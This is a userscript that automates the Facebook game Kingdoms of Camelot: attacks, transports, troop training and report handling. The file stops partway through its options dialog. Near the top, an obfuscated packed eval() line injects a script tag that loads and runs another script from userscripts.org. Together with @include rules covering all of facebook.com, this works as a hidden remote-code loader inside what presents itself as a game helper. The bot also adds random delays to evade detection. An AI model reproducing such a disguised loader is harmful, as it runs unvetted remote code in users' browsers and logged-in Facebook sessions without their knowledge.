// ==UserScript==
// @name             KOCAttack - Extra Features Plus + Last Update
// @version          0.9.7.0
// @namespace        KOCAttack-Extra
// @homepage         http://userscripts.org/scripts/show/89473
// @description      Same as the original Kingdoms of Camelot Attack script, but with extra features.
// @include          *apps.facebook.com/kingdomsofcamelot*
// @include          *kingdomsofcamelot.com/*main_src.php*
// @include          *kingdomsofcamelot.com/*newgame_src.php*
// @include           http://www.facebook.com/*
// @include           https://www.facebook.com/*
// @include           http://*.facebook.com/*
// @include           https://*.facebook.com/*
// @include          *facebook.com/connect/uiserver.php*
// @include          *kingdomsofcamelot.com/*standAlone.php*
// @include					 *facebook.com/4oh4.php

// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))


var KOCAversion = '1.0 Beta';
//============================================================================================================
// Override the default alert functionality of the web browser (which causes the script to pause)
// Instead of displaying alert popups, messages will be displayed in the firefox console
unsafeWindow.alert = function(message) {
	console.info("Javascript Alert: "+message);
	if(typeof(GM_log)=="function"){
		GM_log("Javascript Alert: "+message);
	}
}
//============================================================================================================
alert = unsafeWindow.alert;
// String prototypes
String.prototype.trim = function() { return this.replace(/^\s+|\s+$/g, ''); }
String.prototype.StripQuotes = function() {
	return this.replace(/"/g,'');
};
//============================================================================================================
if(!this.JSON2){JSON2={};}
(function(){function f(n){return n<10?'0'+n:n;}
if(typeof Date.prototype.toJSON!=='function'){Date.prototype.toJSON=function(key){return this.getUTCFullYear()+'-'+
f(this.getUTCMonth()+1)+'-'+
f(this.getUTCDate())+'T'+
f(this.getUTCHours())+':'+
f(this.getUTCMinutes())+':'+
f(this.getUTCSeconds())+'Z';};String.prototype.toJSON=Number.prototype.toJSON=Boolean.prototype.toJSON=function(key){return this.valueOf();};}
var cx=/[\u0000\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g,escapable=/[\\\"\x00-\x1f\x7f-\x9f\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g,gap,indent,meta={'\b':'\\b','\t':'\\t','\n':'\\n','\f':'\\f','\r':'\\r','"':'\\"','\\':'\\\\'},rep;function quote(string){escapable.lastIndex=0;return escapable.test(string)?'"'+string.replace(escapable,function(a){var c=meta[a];return typeof c==='string'?c:'\\u'+('0000'+a.charCodeAt(0).toString(16)).slice(-4);})+'"':'"'+string+'"';}
function str(key,holder){var i,k,v,length,mind=gap,partial,value=holder[key];if(value&&typeof value==='object'&&typeof value.toJSON==='function'){value=value.toJSON(key);}
if(typeof rep==='function'){value=rep.call(holder,key,value);}
switch(typeof value){case'string':return quote(value);case'number':return isFinite(value)?String(value):'null';case'boolean':case'null':return String(value);case'object':if(!value){return'null';}
gap+=indent;partial=[];if(Object.prototype.toString.apply(value)==='[object Array]'){length=value.length;for(i=0;i<length;i+=1){partial[i]=str(i,value)||'null';}
v=partial.length===0?'[]':gap?'[\n'+gap+
partial.join(',\n'+gap)+'\n'+
mind+']':'['+partial.join(',')+']';gap=mind;return v;}
if(rep&&typeof rep==='object'){length=rep.length;for(i=0;i<length;i+=1){k=rep[i];if(typeof k==='string'){v=str(k,value);if(v){partial.push(quote(k)+(gap?': ':':')+v);}}}}else{for(k in value){if(Object.hasOwnProperty.call(value,k)){v=str(k,value);if(v){partial.push(quote(k)+(gap?': ':':')+v);}}}}
v=partial.length===0?'{}':gap?'{\n'+gap+partial.join(',\n'+gap)+'\n'+
mind+'}':'{'+partial.join(',')+'}';gap=mind;return v;}}
if(typeof JSON2.stringify!=='function'){JSON2.stringify=function(value,replacer,space){var i;gap='';indent='';if(typeof space==='number'){for(i=0;i<space;i+=1){indent+=' ';}}else if(typeof space==='string'){indent=space;}
rep=replacer;if(replacer&&typeof replacer!=='function'&&(typeof replacer!=='object'||typeof replacer.length!=='number')){throw new Error('JSON.stringify');}
return str('',{'':value});};}
if(typeof JSON2.parse!=='function'){JSON2.parse=function(text,reviver){var j;function walk(holder,key){var k,v,value=holder[key];if(value&&typeof value==='object'){for(k in value){if(Object.hasOwnProperty.call(value,k)){v=walk(value,k);if(v!==undefined){value[k]=v;}else{delete value[k];}}}}
return reviver.call(holder,key,value);}
cx.lastIndex=0;if(cx.test(text)){text=text.replace(cx,function(a){return'\\u'+
('0000'+a.charCodeAt(0).toString(16)).slice(-4);});}
if(/^[\],:{}\s]*$/.test(text.replace(/\\(?:["\\\/bfnrt]|u[0-9a-fA-F]{4})/g,'@').replace(/"[^"\\\n\r]*"|true|false|null|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?/g,']').replace(/(?:^|:|,)(?:\s*\[)+/g,''))){j=eval('('+text+')');return typeof reviver==='function'?walk({'':j},''):j;}
throw new SyntaxError('JSON.parse');};}})();
if(!this.GM_log) {
	GM_log=function(m) {
		console.log(m);
	}
	GM_registerMenuCommand=function(text,f) {
	}
}
if(!this.unsafeWindow) {
	unsafeWindow={};
}
//============================================================================================================
var KOCAttack={
	startListenTime:null,
	prevAttack:{'x':"350",'y':'350'},
	options:null,
	iframeCommunicator:{},
	isChrome:navigator.userAgent.toLowerCase().indexOf('chrome') > -1,
	valuesCache:{},
	seed:{},
	currentPage:null,
//-------------------nHtml------------------------------------------------------------------------------------
FindByXPath:function(obj,xpath,nodetype) {
	if(!nodetype){
		nodetype = XPathResult.FIRST_ORDERED_NODE_TYPE;
	}
	try {
		var q=document.evaluate(xpath,obj,null,nodetype,null);
	} catch(e) {
		GM_log('bad xpath:'+xpath);
	}
	if(nodetype == XPathResult.FIRST_ORDERED_NODE_TYPE){
		if(q && q.singleNodeValue) { return q.singleNodeValue; }
	}else{
		if(q){
			return q;
		}
	}
	return null;
},
//------------------------------------------------------------------------------------------------------------
ClickWin:function(win,obj,evtName) {
	var evt = win.document.createEvent("MouseEvents");
	evt.initMouseEvent(evtName, true, true, win,
		0, 0, 0, 0, 0, false, false, false, false, 0, null);
	return !obj.dispatchEvent(evt);
},
//------------------------------------------------------------------------------------------------------------
Click:function(obj) {
	return this.ClickWin(window,obj,'click');
},
//------------------------------------------------------------------------------------------------------------
ClickTimeout:function(obj,millisec) {
	window.setTimeout(function() {
		return KOCAttack.ClickWin(window,obj,'click');
	},millisec+Math.floor(Math.random()*500));
},
//------------------------------------------------------------------------------------------------------------
SetSelect:function(obj,v) {
	for(var o=-1,j = obj.options.length; ++o<j;) {
		if(v==obj.options[o].value) { obj.options[o].selected=true; return true; }
	}
	return false;
},
//-------------------End nHtml--------------------------------------------------------------------------------
ArrayRemoveItem:function(array, from, to) {
  var rest = array.slice((to || from) + 1 || array.length);
  array.length = from < 0 ? array.length + from : from;
  return array.push.apply(array, rest);
},
//------------------------------------------------------------------------------------------------------------
is_int:function(value){
  if((parseFloat(value) == parseInt(value)) && !isNaN(value)){
      return true;
  } else {
      return false;
  }
},
//------------------------------------------------------------------------------------------------------------
inspect:function(obj, maxLevels, level){
  var str = '', type, msg;
    if(level == null)  level = 0;
    if(maxLevels == null) maxLevels = 1;
    if(maxLevels < 1)
        return '<font color="red">Error: Levels number must be > 0</font>';
    if(obj == null)
    return '<font color="red">Error: Object <b>NULL</b></font>';
    str += '<ul>';
    for(var property in obj)
    {
      try
      {
          type =  typeof(obj[property]);
          str += '<li>(' + type + ') ' + property +
                 ( (obj[property]==null)?(': <b>null</b>'):(': '+obj[property])) + '</li>';
          if((type == 'object') && (obj[property] != null) && (level+1 < maxLevels))
          str += inspect(obj[property], maxLevels, level+1);
      }
      catch(err)
      {
        if(typeof(err) == 'string') msg = err;
        else if(err.message)        msg = err.message;
        else if(err.description)    msg = err.description;
        else                        msg = 'Unknown';
        str += '<li><font color="red">(Error) ' + property + ': ' + msg +'</font></li>';
      }
    }
      str += '</ul>';
    return str;
},
//------------------------------------------------------------------------------------------------------------
ById:function(id) {
	return document.getElementById(id);
},
//------------------------------------------------------------------------------------------------------------
ByName:function(name) {
	return document.getElementsByName(name);
},
//------------------------------------------------------------------------------------------------------------
AddText:function(box1,txt) {
	var txtObj;
	box1.appendChild(txtObj=document.createTextNode(txt));
	return txtObj;
},
//------------------------------------------------------------------------------------------------------------
AddHtml:function(box1,txt) {
	var txtObj;
	var sp=document.createElement('span');
	sp.innerHTML=txt;
	box1.appendChild(sp);
	return txtObj;
},
//------------------------------------------------------------------------------------------------------------
getAttackTypeSelected:function (){
  if (document.getElementById('modal_attack_tab_4').className == 'selected')  // attack
    return 0;
  if (document.getElementById('modal_attack_tab_1').className == 'selected')  // transport
    return 1;
  if (document.getElementById('modal_attack_tab_3').className == 'selected')  // scout
    return 2;
  if (document.getElementById('modal_attack_tab_2').className == 'selected')  // reinforce
    return 3;
  if (document.getElementById('modal_attack_tab_5').className == 'selected')  // reassign
    return 4;
	return null;
},
//------------------------------------------------------------------------------------------------------------
MinDigits:function(num,digits) {
        while((""+num).length<digits) {
                num+="0";
        }
        return num;
},
//------------------------------------------------------------------------------------------------------------
SecsToStr:function(secs) {
		secs=Math.floor(secs);
        return 	Math.floor(secs/60/60/24%60)+
			":"+this.MinDigits(Math.floor(secs/60/60%60),2)+
			":"+this.MinDigits(Math.floor(secs/60%60),2);
},
//------------------------------------------------------------------------------------------------------------
	DoUnsafeWindow:function(func, execute_by_embed) {
		if(this.isChrome || execute_by_embed) {
			var scr=document.createElement('script');
			scr.innerHTML=func;
			document.body.appendChild(scr);
		} else {
			try {
				eval("unsafeWindow."+func);
			} catch (error) {
				this.Log("A javascript error has occurred when executing a function via DoUnsafeWindow. Error description: "+error.description);
			}
		}
	},
//------------------------------------------------------------------------------------------------------------
	GetSeed:function() {
		return unsafeWindow.seed;
	},
//------------------------------------------------------------------------------------------------------------
	ShowImportExportBox:function() {
		var div=this.ById('ImportExportBoxDiv');
		if(!div) {
			div=document.createElement('div');
			div.id='KOCAttackViewAttacks';
			div.setAttribute('style', 'z-index:100000; position:absolute; left:8px; top:8px; background-color:#fff; border:3px solid #888; padding:10px;');
			document.body.appendChild(div);
		}
		div.innerHTML = '';
		var m = '<a id="ImportBoxCancel" class="button20"><span>Close</span></a>';
		m += '<a id="ImportData" class="button20"><span>Import</span></a>';
		m += '<a id="ExportData" class="button20"><span>Export</span></a>&nbsp;';
		var cities=this.GetSeed().cities;
		var citysel ='<select id=srcCity>';
		for(var c=-1,j = cities.length; ++c<j;) {
			citysel += '<option value="'+cities[c][0]+'">'+cities[c][1]+'</option>';
		}
		citysel += '<option value=options>Options</option>';
		citysel += '</select>';
		m += citysel;
		m += '<br><textarea id="ImportExportArea" rows=25 cols=60></textarea>';
		div.innerHTML = m;
		this.ById('ImportBoxCancel').addEventListener('click',function() {
		  div.innerHTML = '';
		  div.style.display='none';
		},false);
		this.ById('ImportData').addEventListener('click',function() {
		},false);
		this.ById('ExportData').addEventListener('click',function() {
		  var x;
    	  var names=KOCAttack.browser_listValues();
		  var obj={};
		  var serverId=KOCAttack.GetServerId();
		  for(var n=-1,j = names.length; ++n<j;) {
		    var name=names[n];
			var a = name.substring(0,11);
			var b = 'attack_'+serverId+'_';
			if (a==b ) {
  		      var sid=KOCAttack.GetServerIdFromName(name);
		      if(sid!=serverId) continue;
		      var v=KOCAttack.browser_getValue(name,null);
			  if(v!=null && v!=undefined && v!=""){
			    x = JSON2.parse(v);
			    if (x.fromCity == this.ById('srcCity').value) {
			      obj[name]=v;
			    }
		      }
			}
			else if (this.ById('srcCity').value == 'options') {
  		      var sid=KOCAttack.GetServerIdFromName(name);
		      if(sid!=serverId) continue;
		      var v=KOCAttack.browser_getValue(name,null);
			  if(v!=null && v!=undefined && v!=""){
				obj[name]=v;
			   }
			}
		  }
		  this.ById('ImportExportArea').value = JSON2.stringify(obj);
		},false);
},
//------------------------------------------------------------------------------------------------------------
	ShowViewAttacksDialog:function() {
		var t=this;
		t.attacks=[];
		var div=t.ById('KOCAttackViewAttacks');
		if(!div) {
			div=document.createElement('div');
			div.id='KOCAttackViewAttacks';
			div.setAttribute('style', 'z-index:100000; position:absolute; left:8px; top:8px; background-color:#fff; border:3px solid #888; padding:10px;');
			document.body.appendChild(div);
		}
		var cities=this.GetSeed().cities;
		var citysel ='<select id=srcCity>';
		citysel += '<option value=All>All Cities</option>';
		for(var c=-1,j = cities.length; ++c<j;) {
			citysel += '<option value="'+cities[c][1]+'">'+cities[c][1]+'</option>';
		}
		citysel += '</select>';
		var levelsel ='<select id=srcLevel>';
		levelsel += '<option value="All">All Levels</option>';
		for(var c=0; ++c<=11;) {
			levelsel += '<option value="'+c+'">Level '+c+'</option>';
		}
		levelsel += '</select>';
		var typesel ='<select id=srcAttackType>';
		typesel += '<option value="All">All</option>';
		typesel += '<option value="normal">Attacks</option>';
		typesel += '<option value="transport">Transports</option>';
		typesel += '<option value="bulkadded">Bulk Adds</option>';
		typesel += '</select>';
		div.style.display='block';
		div.innerHTML='';
		var m = '<DIV id="srcAttackOpts" style="height:30px">\
		<TABLE><TR valign=bottom><TD class=xtab width=100 align=center>Search for: </td><TD align=left>\
		<SELECT id=srcAttack>\
		<OPTION value=All>All</option>\
		<OPTION value=Camp>Barb Camp</option>\
		<OPTION value=Wilderness>Wilderness</option>\
		<OPTION value=Grassland>Grassland</option>\
		<OPTION value=Lake>Lake</option>\
		<OPTION value=Mountains>Mountains</option>\
		<OPTION value=Forest>Woods</option>\
		<OPTION value=Hills>Hills</option>\
		<OPTION value=Plain>Plains</option>\
		<OPTION value=City>City</option>\
		<OPTION value=Transport>Transport</option>\
		<OPTION value=Unknown>Unknown</option>\
		</select></td>\
		<td class=xtab width=100 align=center>Select City: &nbsp; </td>\
		 <td align=left><span id=ptattackcity></span></td>\
		 <td class=xtab width=100 align=center>Select Level: &nbsp; </td>\
		 <td align=left><span id=ptattacklevel></span></td>\
		 <td class=xtab width=100 align=center>Select Type: &nbsp; </td>\
		 <td align=left><span id=ptattacktype></span></td></tr>\
		</table></div>\
		<a id="KOCAttackViewAttacksCancel" class="button20"><span>Close</span></a>\
		<a id="KOCAttackViewAttacksList" class="button20"><span>List Attacks</span></a>\
		<a id="KOCAttackViewAttacksClearList" class="button20"><span>Clear List</span></a>\
		<a id="KOCAttackViewAttacksDelete" class="button20"><span>Delete Selected</span></a>\
		<br><br><DIV id="srcAttackResults" style="height:470px; max-height:470px; overflow-y:auto;"></div>\
		';
		var srcAttackResults = t.ById("srcAttackResults");
		if (srcAttackResults != null){
		  t.ById('KOCAttackViewAttacksClearList').click();
		}
		div.innerHTML = m;
		t.ById('ptattackcity').innerHTML = citysel;
		t.ById('ptattacklevel').innerHTML = levelsel;
		t.ById('ptattacktype').innerHTML = typesel;
		t.ById('KOCAttackViewAttacksClearList').addEventListener('click',function() {
			t.ById('srcAttackResults').innerHTML='';
		},false);
		t.ById('KOCAttackViewAttacksCancel').addEventListener('click',function() {
			div.style.display='none';
		},false);
		t.ById('KOCAttackViewAttacksList').addEventListener('click',function() {
		  t.attacks=[];
		  t.DetailAttacks();
		  var typeQuery = t.ById('srcAttackType').value;
		  var cityQuery = t.ById('srcCity').value;
		  var levelQuery = t.ById('srcLevel').value;
		  var attackQuery = t.ById('srcAttack').value;
		  var h = '<table>';
		  h += '<tr><td><input type=checkbox id=selAllAttacks></td><td>&nbsp;</td><td>City</td><td>Coords</td><td nowrap>What</td>';
		  h += '<td>Type</td><td>Attack Troops</td><td>Suicide Troops/Resources</td><td>Dist</td><td>Time</td><td>Ignore</td></tr>';
		  var tableRows= '';
		  var count = 1
		  for(var a=-1,j= t.attacks.length; ++a<j;) {
			var levelInfo=t.GetLevelInfo(t.attacks[a]);
			if (levelInfo==undefined) levelInfo='';
			var type;
			if (levelInfo.type){
			  type = levelInfo.type;
			} else {
			  type = 'Unknown';
			}
			var displayRow = '';
			if (cityQuery != 'All'){
			  if (t.GetCityName(t.attacks[a]['fromCity']) != cityQuery){
			    continue;
			  }
			}
			if (levelQuery != 'All'){
			  if (levelInfo.level != levelQuery){
			    continue;
			  }
			}
			if (typeQuery != 'All'){
			  if (t.attacks[a].currenttattackwavetype != typeQuery){
			    continue;
			  }
			}
			if (attackQuery != 'All'){
			  if (type != attackQuery){
			    continue;
			  }
			}
			tableRows += '<tr id=row'+count+' style="display: '+displayRow+';">';
			tableRows += '<td><input type=checkbox id=aasel'+count+'>';
			tableRows += '<td>'+count+'</td><td>'+t.GetCityName(t.attacks[a]['fromCity'])+'</td>';
			tableRows += '<td id=aacoords'+count+' onclick="aaGotoMapHide('+t.attacks[a].xy[0]+','+t.attacks[a].xy[1]+')">'+t.attacks[a].xy[0]+','+t.attacks[a].xy[1]+'</td>';
			tableRows += '<td nowrap>'+type+' Level '+levelInfo.level+'</td>';
			tableRows += '<td>'+t.attacks[a].currenttattackwavetype+'</td>';
            		tableRows += '<td>';
			if(typeof(t.attacks[a].troops)=="object") {
			  var troops='';
			  for(var i=0,j=t.attacks[a].troops.length; ++i<j;) {
			    troops += t.attacks[a].troops[i]+',';
   			}
			  troops = troops.substring(0, troops.length - 1);
			  tableRows += troops;
  		}
			else{
			  tableRows += '&nbsp;';
			}
      tableRows += '</td>';
      tableRows += '<td>';
			if(typeof(t.attacks[a].suicidewave)=="object") {
			  var suicide='';
			  for(var i=0,j=t.attacks[a].suicidewave.length; ++i<j;) {
			    suicide += t.attacks[a].suicidewave[i]+',';
   			}
			  suicide = suicide.substring(0, suicide.length - 1);
			  tableRows += suicide;
			}
			else if (typeof(t.attacks[a].resources)=="object"){
			  var resources='';
			  for(var i=0,j=t.attacks[a].resources.length; ++i<j;) {
			    resources += t.attacks[a].resources[i]+',';
   			}
			  resources = resources.substring(0, resources.length - 1);
			  tableRows += resources;
			}
			else {
			  tableRows += '&nbsp;';
			}
      tableRows += '</td>';
 	  var distance=t.CalcXYDist({'x':t.attacks[a].xy[0],'y':t.attacks[a].xy[0]},{'x':t.GetCityCoordsX(t.attacks[a]['fromCity']),'y':t.GetCityCoordsX(t.attacks[a]['fromCity'])});
	  tableRows += '<td>'+parseInt(distance)+'</td>';
			var nowSecs=new Date().getTime()/1000;
			tableRows += '<td>'+t.SecsToStr(nowSecs-t.attacks[a].time)+'</td>';
			var ignChecked = '';
			if (t.attacks[a].ignore == null || t.attacks[a].ignore==undefined){
			  ignChecked = '';
			}else{
			  ignChecked = 'CHECKED';
			}
			tableRows += '<td><input type=checkbox name=chkIgnore id='+count+' '+ignChecked+'></td>';
			tableRows += '</tr>';
		    	count++;
		}
		  h += tableRows + '</table>';
		  t.ById('srcAttackResults').innerHTML = h;
          t.ById('KOCAttackViewAttacksDelete').addEventListener('click',function() {
		    var deletes = 0;
			for (var i=0; ++i<count;){
			  var row = 'aasel'+i;
			  if (t.ById(row) == undefined) continue;
			  if (t.ById(row).checked == true){
			    var c = t.ById('aacoords'+i).innerHTML;
			    var xy = c.split(",");
			    GM_log('Coords '+xy[0]+' '+xy[1]);
			    t.DeleteAttack(xy[0],xy[1]);
				deletes++;
			  }
			}
			window.alert(deletes+' of coords deleted');
		  },false);
		  for (var i=0; ++i<count;){
		    var ignore = i;
			t.addEvent(t.ById(ignore), "click", t.ChangeIgnore);
		  }
		  t.ById('selAllAttacks').addEventListener('click',function() {
		    var myChecked = true;
			if (t.ById('selAllAttacks').checked == false){
			  myChecked = false;
			}
			for (var i=0; ++i<count;){
			  var row = 'aasel'+i;
			  t.ById(row).checked=myChecked;
			}
    	  },false);
 	   },false);
	},
//------------------------------------------------------------------------------------------------------------
	addEvent:function(obj, type, fn){
	  if (obj.attachEvent) {
	    obj['e' + type + fn] = fn;
        obj[type + fn] = function(){obj['e' + type + fn](window.event);}
        obj.attachEvent('on' + type, obj[type + fn]);
      }
      else{
         obj.addEventListener(type, fn, false);
      }
	},
//------------------------------------------------------------------------------------------------------------
	ChangeIgnore:function(e){
	  var c = this.ById('aacoords'+e.target.id).innerHTML;
	  var xy = c.split(",");
	  var serverID = KOCAttack.GetServerId();
	  var attackname = 'attack_'+serverID+'_'+xy[0]+','+xy[1];
	  var str = GM_getValue(attackname,'')
	  if(!str) return null;
	  attack= JSON2.parse(str);
	  attack.ignore=e.target.checked?true:undefined;
	  GM_setValue(attackname,JSON2.stringify(attack));
	},
//------------------------------------------------------------------------------------------------------------
	GetAttack:function(x,y) {
		var str=this.browser_getValue(this.GetAttackName(x,y),'');
		if(!str) return null;
		return JSON2.parse(str);
	},
//------------------------------------------------------------------------------------------------------------
	GetCityName:function(cityid) {
	  var cityName;
	  for(var a=-1,j=unsafeWindow.seed.cities.length; ++a<j;) {
	    if(unsafeWindow.seed.cities[a][0] == cityid){
		  var cityName = unsafeWindow.seed.cities[a][1];
		  }
	  }
	  return cityName;
	},
//------------------------------------------------------------------------------------------------------------
	GetCityCoordsX:function(cityid) {
	  var cityName;
	  for(var a=-1,j=unsafeWindow.seed.cities.length; ++a<j;) {
	    if(unsafeWindow.seed.cities[a][0] == cityid){
		  var x = unsafeWindow.seed.cities[a][2];
		}
	  }
	  return x;
	},
//------------------------------------------------------------------------------------------------------------
	GetCityCoordsY:function(cityid) {
	  var cityName;
	  for(var a=-1,j=unsafeWindow.seed.cities.length; ++a<j;) {
	    if(unsafeWindow.seed.cities[a][0] == cityid){
		  var y = unsafeWindow.seed.cities[a][3];
		  }
	  }
	  return y;
	},
//------------------------------------------------------------------------------------------------------------
	ReloadWindow:function() {
		var m=/^[a-zA-Z]+([0-9]+)\./.exec(document.location.hostname);
		if (!m){
			    var $rUrl = parent.window.location.href;
			    parent.window.location = $rUrl;
			//history.go(0);
			return;
		}
		var goto = window.location.protocol+'//apps.facebook.com/kingdomsofcamelot/?s='+m[1];
		var t = '<FORM target="_top" action="'+ goto +'" method=post><INPUT id=xxButReload type=submit value=RELOAD><input type=hidden name=s value="'+ m[1] +'"</form>';
		var e = document.createElement ('div');
		e.innerHTML = t;
		document.body.appendChild (e);
		setTimeout (function (){document.getElementById('xxButReload').click();}, 0);
	},
//------------------------------------------------------------------------------------------------------------
	ShowOptionsDialog:function() {
		var div=this.ById('KOCAttackOptions');
		if(!div) {
			div=document.createElement('div');
			div.id='KOCAttackOptions';
			div.setAttribute('style', 'z-index:100000; position:absolute; left:8px; top: 8px;background-color:#fff; border:3px solid #888; padding:10px; maxWidth:700px;');
			document.body.appendChild(div);
		}
		var okCitiesHtml="<span onmousedown='return false; '>";
		for(var c=0; ++c<=8;) {
			okCitiesHtml+=
				"<a style='font-size: 11px; padding: 2px; cursor: pointer; text-decoration: none' id='KOCAttackOkCities_"+c+"'>"+c+"</a>&nbsp;";
		}
		okCitiesHtml+='</span>';
		var attackfirst = '';
		var arrData = [["Camp", "Camps"],["City", "City"],["Transport", "Transport"],["Wilderness", "Wildernesses"],["None", "None"]];
		for (var i=-1,j=arrData.length; ++i < j;){
			attackfirst += "<input type=radio name=KOCAttackPriority id='KOCAttackPriority_"+arrData[i][0]+"' value="+arrData[i][0]+" "+(arrData[i][0]==this.options.attackpriority?'checked':'')+"/>";
			attackfirst += "<label for='KOCAttackPriority_"+arrData[i][0]+"'>"+arrData[i][1]+"</label>";
		};
		div.style.display='block';
		div.innerHTML='';
		this.options=this.GetOptions();
		div.innerHTML="<form><table>"+
			"<tr><td valign='top' align='center'><img src='img/units/unit_6_50.jpg' /></td><td valign='top'>"+
			"Attack Order: <select id='KOCAttackOrder'><option value='mostTroops'>Use most troops first</option><option value='closest'>Closest targets first</option></select><br />"+
			"Attack Type: <input type='checkbox' "+(this.options.attackTypeCamp?'checked':'')+" id='KOCAttackTypeCamp'>Camp "+
			"<input type='checkbox' "+(this.options.attackTypeWild?'checked':'')+" id='KOCAttackTypeWild'>Wilderness "+
			"<input type='checkbox' "+(this.options.attackTypeCity?'checked':'')+" id='KOCAttackTypeCity'>City "+
			"<input type='checkbox' "+(this.options.attackTypeTransport?'checked':'')+" id='KOCAttackTypeTransport'>Transport<br> "+
			"Prioritise attacks for : "+attackfirst+
			"<br><br />"+
			"<input id='KOCAttackDelay' value='"+this.options.attackDelay+"' size='3' /> seconds inbetween sending each attack<br />"+
			"Time inbetween sending to the <u>same target</u>...<br />"+
			"<div style='margin-left: 40px'>"+
			"Attacking camp:<input id='KOCAttackHoursSinceLastCamp' value='"+(this.options.attackSecsSinceLastCamp/(60*60))+"' size='3' />hrs<br />"+
			"Attacking wilderness:<input id='KOCAttackHoursSinceLastWild' value='"+(this.options.attackSecsSinceLastWild/(60*60))+"' size='3' />hrs<br />"+
			" Attacking city:<input id='KOCAttackHoursSinceLastCity' value='"+(this.options.attackSecsSinceLastCity/(60*60))+"' size='3' />hrs<br />"+
			" Transporting:<input id='KOCAttackMinsSinceLastTransport' value='"+(this.options.attackSecsSinceLastTransport/(60))+"' size='3' />mins<br />"+
			" If transporting, try to keep at least <input id='KOCAttackTransportReserveAmount' value='"+this.options.transportResourcesReserveAmount+"' size='10' /> of each resource in each city <font color=#FF0000>(NEW)</font>"+
			"</div>"+
			"<input id='KOCAttackRandom' value='"+this.options.randomPercent+"' size='3' />% random adjustment for all delays (to look more human).<br />"+
			"<input id='KOCAttackRally' value='"+this.options.rallyKeep+"' size='3' /> of rally point slots to keep<br />"+
			"<br />"+
			"<input id='KOCAttackMaxDistance' value='"+(this.options.attackMaxDistance)+"' size='3' /> max distance away from city to attack/transport.<br />"+
			"<input id='KOCAttackLockAttackFromCity' type='checkbox' "+(this.options.lockAttackFromCity?'checked':'')+" /> Only launch attacks from city they were first launched from.<br />"+
			"<input id='KOCAttackUnselectKnight' type='checkbox' "+(this.options.knightreset?'checked':'')+" /> Deselect knight when not in attack mode.<br />"+
			"<input id='KOCAttackRetryMarch' type='checkbox' "+(this.options.retryMarch?'checked':'')+" /> Retry march if it has unknown/excess traffic error (press reload after changing this option).<br />"+
			"<input id='KOCAttackImpendingStopAttack' type='checkbox' "+(this.options.impendingStopAttack?'checked':'')+" /> Stop auto attack on impeding alert.<span style='color:red'> (Will not restart auto after the attack. Use at your own risk)</span><br />"+
			"Open up this URL (such as a link to a sound/video file) in a tab when we're under attack:<br /><input id='KOCAttackImpendingAttackUrl' size='60' value='"+(this.options.impendingAttackUrl)+"' /><br />"+
			"</td></tr>"+
			"<tr><td valign='top' align='center'><img src='img/chrome_message_up.png' /></td><td valign='top'>"+
			"<input id='KOCAttackRemoveReports' type='checkbox' "+(this.options.autoRemoveReports?'checked':'')+" /> Auto remove barbarian/wilderness attack reports.<br />"+
			"<input id='KOCAttackRemoveFarmReports' type='checkbox' "+(this.options.autoRemoveFarmReports?'checked':'')+" /> Auto remove farm attack reports.<br />"+
			"<input id='KOCAttackKeepReports' value='"+this.options.keepReports+"' size='3' /> attack reports to keep maximum in the attack dialog.<br />"+
			"<input id='KOCAttackNoViewReports' type='checkbox' "+(this.options.noViewReports?'checked':'')+" /> Disable viewing of reports, this will also disable collecting of reports for the attack page.<br />"+
			"</td></tr>"+
			"<tr><td valign='top' align='center'><img src='img/chome_alliance_up.png' /></td><td valign='top'>"+
			"<input id='KOCAttackPercentOfPopToTrain' value='"+this.options.percentOfPopToTrain+"' size='3' />% of idle population available before we auto train <input id='KOCAttackPercentToTrainOfMax' value='"+this.options.percentToTrainOfMax+"' size='3' />% of max available.<br />"+
			"<span style=\"font-size:10px; color:#555; line-height:18px; \">To enable auto training, toggle the auto train button under a troop type in the barracks.</span><br />"+
			"<span style=\"font-size:10px; color:#555; line-height:18px; \">Note: If you auto train 100% of max population, you might sometimes encounter resource errors due to game caching.</span><br />"+
			"</td></tr>"+
			"<tr><td valign='top' align='center'><img src='img/gold_30.png' /></td><td valign='top'>"+
			"<input id='KOCAttackAutoGoldHappiness' value='"+this.options.autoGoldHappiness+"' size='3' />% happiness before we click auto gold.<br />"+
			"<span style=\"font-size:10px; color:#555; line-height:18px; \">To enable auto gold, toggle the auto gold button from inside your castle overview window.</span><br />"+
			"</td></tr>"+
			"<tr><td valign='top' align='center'><img src='img/gems.png' /></td><td valign='top'>"+
//			"<input id='KOCAttackDisableMapDraw' type='checkbox' "+(this.options.disableDrawMapIcons?'checked':'')+" /> Disable drawing of map icons.<br />"+
//			"<input id='KOCAttackDisableInviteFriends' type='checkbox' "+(this.options.disableInviteFriends?'checked':'')+" /> Disable the annoying \"Invite Friends\" popup dialog in-game.<br />"+
//			"<input id='KOCAttackAutoHelpAlliance' type='checkbox' "+(this.options.autoHelpAlliance?'checked':'')+" /> Automatically help alliance members with building/researching.<br />"+
//			"<input id='KOCAttackHideAllianceHelpRequests' type='checkbox' "+(this.options.hideAllianceHelpRequests?'checked':'')+" /> Hide alliance help requests/reports in chat (if above is checked, then after helping).<br />"+
//			"<input id='KOCAttackAutoPublishGamePopups' type='checkbox' "+(this.options.autoPublishGamePopups?'checked':'')+" /> Automatically publish game popups (such as help requests) to facebook wall.<br />"+
//			"If above is checked, what privacy setting should we use? <select id='KOCAttackAutoPublishPrivacy'><option value='80'>Everyone</option><option value='50'>Friends of Friends</option><option value='40'>Friends Only</option><option value='10'>Only Me</option></select><br />"+
			"<input id='KOCAttackAutoLogBackIn' type='checkbox' "+(this.options.autoLogBackIn?'checked':'')+" /> Automatically log back into domain if disconnected due to maintenance or server down-time.<br />"+
